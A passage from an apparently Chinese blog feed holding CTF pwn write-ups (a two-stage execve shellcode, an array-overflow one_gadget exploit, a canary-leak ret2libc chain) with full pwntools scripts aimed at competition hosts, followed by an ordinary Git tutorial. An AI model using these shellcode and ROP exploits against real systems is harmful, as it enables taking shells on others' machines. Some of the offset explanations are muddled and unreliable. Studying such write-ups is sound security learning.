enabled</span><br></pre></td></tr></table></figure><p>mmap在地址0x114514000分配了0x1000字节的内存，权限为7即可读可写可执行</p><p>mprotect再次确认该内存的权限为7故利用该内存区域即可无视NX</p><p><code>read(0,buf,0x16)</code>读取输入的22字节到buf，execute(buf)通过jmp rdi跳转执行buf(因为buf为第一个参数rdi在64位系统中存储第一个参数)，可利用该处填入shellcode并执行，因为22个字节过短所以选择先执行read的系统调用扩展输入，再二次执行execve shellcode获取shell</p><p>第一阶段：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">shellcode1 = asm(<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">  mov rsi, rdi   ; rsi = buf地址（rdi为execute参数）</span></span><br><span class="line"><span class="string">  mov edi, eax   ; edi = eax（此时eax=0，因main返回0）</span></span><br><span class="line"><span class="string">  mov dl, 0x80   ; rdx = 0x80（读取长度）</span></span><br><span class="line"><span class="string">  syscall        ; 调用read(0, buf, 0x80)</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>)</span><br></pre></td></tr></table></figure><ul><li><strong>目的</strong>：通过<code>read</code>系统调用读取更多数据到<code>buf</code>，覆盖原有Shellcode。</li><li><strong>寄存器状态</strong>：<ul><li><code>rdi</code>（第一个参数）来自<code>execute</code>的参数<code>a1</code>，即<code>buf</code>地址。</li><li><code>eax</code>在<code>main</code>结束时为<code>0</code>（<code>return 0</code>），故<code>edi=0</code>对应<code>read</code>的第一个参数<code>fd=0</code>（标准输入）。</li><li><code>rsi</code>指向<code>buf</code>，<code>rdx=0x80</code>允许读取128字节，远超初始的22字节限制。</li></ul></li></ul><p>第二阶段</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">shellcode2 = asm(<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">  mov rsp, rsi      ; 栈指针指向buf</span></span><br><span class="line"><span class="string">  add rsp, 0x1000   ; 栈顶移至buf末尾（避免覆盖Shellcode）</span></span><br><span class="line"><span class="string">  xor rsi, rsi      ; rsi=0（argv=NULL）</span></span><br><span class="line"><span class="string">  mul rsi           ; rax=0, rdx=0（envp=NULL）</span></span><br><span class="line"><span class="string">  push rax          ; 字符串结尾\0</span></span><br><span class="line"><span class="string">  mov rbx, 0x68732f2f6e69622f ; &quot;/bin//sh&quot;</span></span><br><span class="line"><span class="string">  push rbx          ; 压入字符串地址</span></span><br><span class="line"><span class="string">  mov rdi, rsp      ; rdi指向字符串</span></span><br><span class="line"><span class="string">  mov al, 59        ; execve系统调用号</span></span><br><span class="line"><span class="string">  syscall           ; 触发execve(&quot;/bin//sh&quot;, 0, 0)</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>)</span><br></pre></td></tr></table></figure><ul><li><strong>栈迁移</strong>：将栈指针<code>rsp</code>指向<code>buf</code>末尾（<code>+0x1000</code>），确保后续<code>push</code>操作不会覆盖Shellcode。</li><li><strong>参数构造</strong>：<ul><li><code>xor rsi, rsi</code>和<code>mul rsi</code>将<code>rsi</code>、<code>rax</code>、<code>rdx</code>清零，对应<code>argv=0</code>和<code>envp=0</code>。</li><li>压入字符串<code>/bin//sh</code>并设置<code>rdi</code>指向它，构造<code>execve</code>参数。</li></ul></li></ul><p>完整exp：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(log_level=<span class="string">&#x27;debug&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>,os = <span class="string">&#x27;Linux&#x27;</span>)</span><br><span class="line"><span class="comment">#io = process(&quot;./pwn&quot;)</span></span><br><span class="line">io = remote(<span class="string">&#x27;node.vnteam.cn&#x27;</span>,<span class="number">44612</span>)</span><br><span class="line"></span><br><span class="line">shellcode1 = asm(<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">  mov rsi, rdi   </span></span><br><span class="line"><span class="string">  mov edi, eax   </span></span><br><span class="line"><span class="string">  mov dl, 0x80   </span></span><br><span class="line"><span class="string">  syscall        </span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>)</span><br><span class="line">shellcode2 = asm(<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">  mov rsp, rsi      </span></span><br><span class="line"><span class="string">  add rsp, 0x1000   </span></span><br><span class="line"><span class="string">  xor rsi, rsi      </span></span><br><span class="line"><span class="string">  mul rsi           </span></span><br><span class="line"><span class="string">  push rax          </span></span><br><span class="line"><span class="string">  mov rbx, 0x68732f2f6e69622f </span></span><br><span class="line"><span class="string">  push rbx          </span></span><br><span class="line"><span class="string">  mov rdi, rsp      </span></span><br><span class="line"><span class="string">  mov al, 59        </span></span><br><span class="line"><span class="string">  syscall          </span></span><br><span class="line"><span class="string">  execve(&quot;/bin//sh&quot;, 0, 0)</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(shellcode1))</span><br><span class="line">io.send(shellcode1)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">9</span>+shellcode2 <span class="comment">#第一部分shellcode为9字节</span></span><br><span class="line">io.send(payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> WP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>比赛复现</title>
      <link href="/2025/01/19/%E6%98%A5%E7%A7%8B%E6%9D%AF/"/>
      <url>/2025/01/19/%E6%98%A5%E7%A7%8B%E6%9D%AF/</url>
      
        <content type="html"><![CDATA[<h1 id="春秋杯"><a href="#春秋杯" class="headerlink" title="春秋杯"></a>春秋杯</h1><h2 id="bypass"><a href="#bypass" class="headerlink" title="bypass:"></a>bypass:</h2><h3 id="分析："><a href="#分析：" class="headerlink" title="分析："></a>分析：</h3><p><img src="/../images/%E6%98%A5%E7%A7%8B%E6%9D%AF/check.png" alt="1"></p><p>main函数用于处理一个名为.BYPASS的文件，会进行一系列验证操作，验证成功，程序会进入一个函数等待用户输入。程序无直接的后门函数。</p><p>可获得libc基地址：</p><p><img src="/../images/%E6%98%A5%E7%A7%8B%E6%9D%AF/libc.png" alt="1"></p><p><img src="/../images/%E6%98%A5%E7%A7%8B%E6%9D%AF/%E5%BE%AA%E7%8E%AF.png" alt="1"></p><p>主要漏洞在<code>sub_400978()</code>函数</p><p><img src="/../images/%E6%98%A5%E7%A7%8B%E6%9D%AF/%E6%BC%8F%E6%B4%9E%E5%87%BD%E6%95%B0.png" alt="1"></p><p>s，s2，v4三个数组在栈上相邻，有两次循环赋值，循环赋值的结束条件是<code>s[i]=0</code>，memset只清空了s数组，故第一次循环赋值后s2不再是都为0，所以在第二次循环赋值时可以通过第一次给s2的赋值来达到数组越界覆盖返回地址为获取shell地址。(要注意控制好下标i，使能正确覆写到返回地址)</p><p><strong>计算i：</strong>i位于rbp-2h即v4[526]，i有两个字节即v4[526]和v4[527] (为了更好表示才这样写，实际上这种写法是错的)，v4[526]&#x3D;s[531],故i的值为531，十进制的531转换为二进制为<code>1000010011</code>，为了将其表示为16进制需要在前面补零即<code>00000010 00010011</code>，即高位字节’0x02’，低位字节’0x13’ 64位小端序程序低位字节存储在内存的低地址处，高位字节反之，栈是从高地址想低地址生长的，我们是从低地址向高地址覆盖的所以覆盖时要先覆盖低位字节再覆盖高位字节。</p><p>因为给了libc版本发现可以直接找one_gadget来获取shell</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$one_gadget</span> libc.so.6</span><br></pre></td></tr></table></figure><p><img src="/../images/%E6%98%A5%E7%A7%8B%E6%9D%AF/one_gadget.png" alt="1"></p><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(log_level = <span class="string">&#x27;debug&#x27;</span>,arch = <span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line">io = remote(<span class="string">&#x27;39.106.48.123&#x27;</span>,<span class="number">42877</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">libc=ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line"><span class="comment">#1</span></span><br><span class="line">io.send(<span class="built_in">str</span>(<span class="number">1111</span>))<span class="comment">#通过第一次检测，仅输入4个字节</span></span><br><span class="line">io.recvuntil(<span class="string">&#x27;Invalid\n&#x27;</span>)</span><br><span class="line">libc_base=u64(io.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))-libc.sym[<span class="string">&#x27;puts&#x27;</span>]<span class="comment">#获取libc基地址</span></span><br><span class="line"><span class="comment">#2</span></span><br><span class="line">io.send(p32(<span class="number">0</span>))</span><br><span class="line">one_gadget=[<span class="number">0x4f2a5</span>,<span class="number">0x4f302</span>,<span class="number">0x10a2fc</span>]</span><br><span class="line"><span class="comment">#19是因为512与526之间相差14，循环赋值有5的距离故为14+5=19</span></span><br><span class="line">payload1=<span class="string">b&#x27;KEY: &#x27;</span>+<span class="string">b&#x27;c&#x27;</span>*<span class="number">19</span>+<span class="string">b&#x27;\x13&#x27;</span>+<span class="string">b&#x27;\x02&#x27;</span>+<span class="string">b&#x27;a&#x27;</span>*<span class="number">8</span>+p64(libc_base+one_gadget[<span class="number">1</span>])</span><br><span class="line"><span class="comment">#仅有one_gadget[1]的条件达成了所以选它</span></span><br><span class="line"></span><br><span class="line">io.sendline(payload1)</span><br><span class="line"></span><br><span class="line">payload2=<span class="string">b&#x27;VAL: &#x27;</span>+<span class="string">b&#x27;b&#x27;</span>*(<span class="number">0x200</span>-<span class="number">5</span>)</span><br><span class="line">pause()<span class="comment">#暂停一下也可以写sleep(1)，不知道为啥不暂停就打不通</span></span><br><span class="line">io.send(payload2)<span class="comment">#为了不被打断所以不能用sendline</span></span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><p>解释：</p><p><img src="/../images/%E6%98%A5%E7%A7%8B%E6%9D%AF/%E5%BE%AA%E7%8E%AF.png" alt="1"></p><p>#1处给v7的值是1111故会break出内循环，先获得libc基地址</p><p>#2处给v7赋值’\x00\x00\x00\x00’不出内循环进入sub_400978()函数</p><h1 id="湘岚杯"><a href="#湘岚杯" class="headerlink" title="湘岚杯"></a>湘岚杯</h1><h2 id="ezlibc"><a href="#ezlibc" class="headerlink" title="ezlibc"></a>ezlibc</h2><h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><p>一道泄露canary的板子题</p><p>checksec：</p><p><img src="/../images/%E6%98%A5%E7%A7%8B%E6%9D%AF/ezlibc.png" alt="2"></p><p>开启了Canary和NX，为动态链接的程序</p><p>bug函数：</p><p><img src="/../images/%E6%98%A5%E7%A7%8B%E6%9D%AF/bug.png" alt="1"></p><p>有明显栈溢出漏洞可以用printf输出canary值，接着泄露libc攻击</p><p>Canary是位于ebp之前的一串随机数据，用来防止栈上的内容溢出进行某些危险攻击</p><p>在bug函数中其实v2即为canary的值，其占用8个字节。</p><p>我们都知道Canary 会在栈上添加一个随机值，以保护程序免受缓冲区溢出攻击，但是也会在栈上多占用一些空间。</p><p>也就是说：</p><p>假如我的 buf 大小为 0x30</p><p>如果是 64 位程序，那么 Canary 就会在栈上额外占用 0x08 的空间作为随机值。</p><p>也就是说 我的可用空间只有 0x22 。</p><p>开启 Canary ： RBP 位于 0x22 + 0x08，Canary位于0x30 - 0x08，Return Address位于0x22 + 0x16</p><p>而 0x30 + 0x08 在不开启 Canary 的情况下是 Return Address 的地址</p><p>关闭 Canary ： RBP 位于 0x30，Return Address位于0x30 + 0x08</p><p>这时候的 0x30 + 0x08 是 Return Address 的地址。</p><p>%s是被<code>\x00</code>截断所以我们只需利用栈溢出吧从buf开始一直到canary前的所有字节覆盖成<code>\x00</code>以外的即可，紧接着把覆盖的字节接收掉，再接收canary。</p><p>接着libc攻击即可。</p><h3 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context(log_level=<span class="string">&#x27;debug&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>,os = <span class="string">&#x27;Linux&#x27;</span>)</span><br><span class="line">io = process(<span class="string">&quot;./ezlibc&quot;</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./ezlibc&#x27;</span>)</span><br><span class="line">payload1=<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x21</span>)+<span class="string">b&#x27;b&#x27;</span></span><br><span class="line">io.sendlineafter(<span class="string">&quot;flag!&quot;</span>,payload1)</span><br><span class="line">io.recvuntil(<span class="string">&#x27;ab&#x27;</span>)</span><br><span class="line">Canary=u64(io.recv(<span class="number">8</span>))</span><br><span class="line">Canary=Canary-<span class="number">0X0a</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;Canary:&#x27;</span>,<span class="built_in">hex</span>(Canary))</span><br><span class="line"></span><br><span class="line">pop_rdi_ret=<span class="number">0x400843</span></span><br><span class="line">ret=<span class="number">0x40059e</span></span><br><span class="line">puts_plt=elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_got=elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">main_addr=<span class="number">0x4006E7</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;puts_plt:&quot;</span>,<span class="built_in">hex</span>(puts_plt))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;plt_got:&quot;</span>,<span class="built_in">hex</span>(puts_got))</span><br><span class="line">payload2=<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x22</span>)+p64(Canary)+<span class="string">b&#x27;a&#x27;</span>*<span class="number">8</span>+p64(pop_rdi_ret)+p64(puts_got)+p64(puts_plt)+p64(main_addr)</span><br><span class="line">io.recvuntil(<span class="string">b&quot;Maybe UR closer to the key&quot;</span>)</span><br><span class="line">io.sendline(payload2)</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">puts_addr=u64(io.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;puts_addr = &quot;</span> + <span class="built_in">hex</span>(puts_addr))</span><br><span class="line">libc=LibcSearcher(<span class="string">&#x27;puts&#x27;</span>,puts_addr)</span><br><span class="line"></span><br><span class="line">libc_base=puts_addr-libc.dump(<span class="string">&#x27;puts&#x27;</span>)</span><br><span class="line">system=libc_base+libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">binsh=libc_base+libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload3=<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x22</span>)+p64(Canary)+<span class="string">b&#x27;a&#x27;</span>*<span class="number">8</span>+p64(ret)+p64(pop_rdi_ret)+p64(binsh)+p64(system)</span><br><span class="line">io.sendline(payload3)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> WP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Git学习</title>
      <link href="/2025/01/16/git%E5%AD%A6%E4%B9%A0/"/>
      <url>/2025/01/16/git%E5%AD%A6%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<h1 id="Git-学习笔记"><a href="#Git-学习笔记" class="headerlink" title="Git 学习笔记"></a>Git 学习笔记</h1><h2 id="一、Git-简介"><a href="#一、Git-简介" class="headerlink" title="一、Git 简介"></a>一、Git 简介</h2><p>Git 是一个开源的分布式版本控制系统，用于有效、高速地处理从小到大的项目版本管理。它允许团队协作开发项目，同时跟踪文件的变更历史。</p><h2 id="二、安装-Git"><a href="#二、安装-Git" class="headerlink" title="二、安装 Git"></a>二、安装 Git</h2><p>在 Windows 上，可以从<a href="">Git 官网</a>下载安装包并安装。在 macOS 和 Linux 上，可以通过包管理器（如 Homebrew 或 apt）安装。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># macOS</span></span><br><span class="line">brew install git</span><br><span class="line"></span><br><span class="line"><span class="comment"># Ubuntu</span></span><br><span class="line"><span class="built_in">sudo</span> apt install git</span><br></pre></td></tr></table></figure><p>安装完成后，可以通过以下命令检查 Git 版本：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git --version</span><br></pre></td></tr></table></figure><h2 id="三、配置-Git"><a href="#三、配置-Git" class="headerlink" title="三、配置 Git"></a>三、配置 Git</h2><p>首次使用 Git 时，需要配置用户信息，这些信息会出现在每次提交中。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 配置全局用户名</span></span><br><span class="line">git config --global user.name <span class="string">&quot;Your Name&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 配置全局用户邮箱</span></span><br><span class="line">git config --global user.email <span class="string">&quot;your_email@example.com&quot;</span></span><br></pre></td></tr></table></figure><h2 id="四、克隆仓库"><a href="#四、克隆仓库" class="headerlink" title="四、克隆仓库"></a>四、克隆仓库</h2><p>克隆仓库是将远程仓库的代码复制到本地的过程。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 克隆远程仓库到本地</span></span><br><span class="line">git <span class="built_in">clone</span> &lt;repository_url&gt;</span><br></pre></td></tr></table></figure><p>例如：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/user/repo.git</span><br></pre></td></tr></table></figure><p>克隆完成后，进入项目目录：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> repo</span><br></pre></td></tr></table></figure><h2 id="五、查看分支"><a href="#五、查看分支" class="headerlink" title="五、查看分支"></a>五、查看分支</h2><p>分支是开发中的独立线程，用于隔离开发工作。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 查看所有分支</span></span><br><span class="line">git branch</span><br></pre></td></tr></table></figure><h2 id="六、切换分支"><a href="#六、切换分支" class="headerlink" title="六、切换分支"></a>六、切换分支</h2><p>切换分支可以让你在不同的开发线程之间切换。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 切换到指定分支</span></span><br><span class="line">git checkout &lt;branch_name&gt;</span><br></pre></td></tr></table></figure><p>如果分支不存在，可以使用以下命令创建并切换：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git checkout -b &lt;new_branch_name&gt;</span><br></pre></td></tr></table></figure><h2 id="七、提交修改"><a href="#七、提交修改" class="headerlink" title="七、提交修改"></a>七、提交修改</h2><p>提交是将本地的更改保存到版本历史中。</p><p>• 查看更改状态：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git status</span><br></pre></td></tr></table></figure><p>• 添加更改到暂存区：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 添加所有更改</span></span><br><span class="line">git add .</span><br><span class="line"></span><br><span class="line"><span class="comment"># 添加指定文件</span></span><br><span class="line">git add &lt;file_name&gt;</span><br></pre></td></tr></table></figure><p>• 提交更改：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git commit -m <span class="string">&quot;Commit message&quot;</span></span><br></pre></td></tr></table></figure><p>提交信息应简洁明了，描述本次更改的内容。</p><h2 id="八、推送更改"><a href="#八、推送更改" class="headerlink" title="八、推送更改"></a>八、推送更改</h2><p>将本地更改推送到远程仓库。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git push origin &lt;branch_name&gt;</span><br></pre></td></tr></table></figure><p>如果当前分支已跟踪远程分支，可以直接使用：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git push</span><br></pre></td></tr></table></figure><h2 id="九、合并分支"><a href="#九、合并分支" class="headerlink" title="九、合并分支"></a>九、合并分支</h2><p>合并分支是将一个分支的更改合并到另一个分支。</p><p>• 切换到目标分支：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git checkout &lt;target_branch&gt;</span><br></pre></td></tr></table></figure><p>• 合并分支：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git merge &lt;source_branch&gt;</span><br></pre></td></tr></table></figure><p>如果合并过程中出现冲突，Git 会提示你手动解决冲突。解决冲突后，需要再次提交更改。</p><h2 id="十、解决冲突"><a href="#十、解决冲突" class="headerlink" title="十、解决冲突"></a>十、解决冲突</h2><p>当合并分支时，如果不同分支对同一文件的同一部分进行了修改，就会出现冲突。</p><p>• 手动解决冲突：打开冲突文件，找到冲突标记（<code>&lt;&lt;&lt;&lt;&lt;&lt;&lt;</code>、<code>=======</code>、<code>&gt;&gt;&gt;&gt;&gt;&gt;&gt;</code>），选择保留的内容，删除冲突标记。</p><p>• 提交解决后的更改：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git add &lt;conflicted_file&gt;</span><br><span class="line">git commit</span><br></pre></td></tr></table></figure><h2 id="十一、查看日志"><a href="#十一、查看日志" class="headerlink" title="十一、查看日志"></a>十一、查看日志</h2><p>查看提交历史可以帮助你了解项目的变更过程。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">log</span></span><br></pre></td></tr></table></figure><p>可以通过以下选项简化日志输出：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 单行显示日志</span></span><br><span class="line">git <span class="built_in">log</span> --oneline</span><br><span class="line"></span><br><span class="line"><span class="comment"># 显示分支图</span></span><br><span class="line">git <span class="built_in">log</span> --graph --oneline</span><br></pre></td></tr></table></figure><h2 id="十二、撤销更改"><a href="#十二、撤销更改" class="headerlink" title="十二、撤销更改"></a>十二、撤销更改</h2><p>如果需要撤销本地更改，可以使用以下命令：</p><p>• 撤销暂存区更改：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git reset &lt;file_name&gt;</span><br></pre></td></tr></table></figure><p>• 撤销工作区更改：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git checkout -- &lt;file_name&gt;</span><br></pre></td></tr></table></figure><p>• 撤销最后一次提交：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git reset HEAD~ --soft</span><br><span class="line"><span class="comment"># 或者硬重置（会丢失所有未提交的更改）</span></span><br><span class="line">git reset HEAD~ --hard</span><br></pre></td></tr></table></figure><h2 id="十三、远程仓库操作"><a href="#十三、远程仓库操作" class="headerlink" title="十三、远程仓库操作"></a>十三、远程仓库操作</h2><p>远程仓库是存储代码的服务器，通常托管在 GitHub、GitLab 等平台上。</p><p>• 查看远程仓库：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git remote -v</span><br></pre></td></tr></table></figure><p>• 添加远程仓库：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git remote add origin &lt;repository_url&gt;</span><br></pre></td></tr></table></figure><p>• 更新远程仓库信息：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git remote update</span><br></pre></td></tr></table></figure><p>• 拉取远程分支：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git pull origin &lt;branch_name&gt;</span><br></pre></td></tr></table></figure><h2 id="十四、常用命令总结"><a href="#十四、常用命令总结" class="headerlink" title="十四、常用命令总结"></a>十四、常用命令总结</h2><p>• 克隆仓库：<code>git clone &lt;repository_url&gt;</code></p><p>• 切换分支：<code>git checkout &lt;branch_name&gt;</code></p><p>• 提交更改：<code>git add .</code>和<code>git commit -m &quot;message&quot;</code></p><p>• 推送更改：<code>git push origin &lt;branch_name&gt;</code></p><p>• 合并分支：<code>git merge &lt;source_branch&gt;</code></p><p>• 查看日志：<code>git log --oneline</code></p><p>• 解决冲突：手动编辑文件，提交更改</p><p>• 撤销更改：<code>git reset</code>或<code>git checkout --</code></p><p>• 更新远程仓库：<code>git pull origin &lt;branch_name&gt;</code></p>]]></content>
      
      
      
        <tags>
            
            <tag> 笔记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ret2shellcode</title>
      <link href="/2024/12/10/ret2shellcode/"/>
      <url>/2024/12/10/ret2shellcode/</url>
      
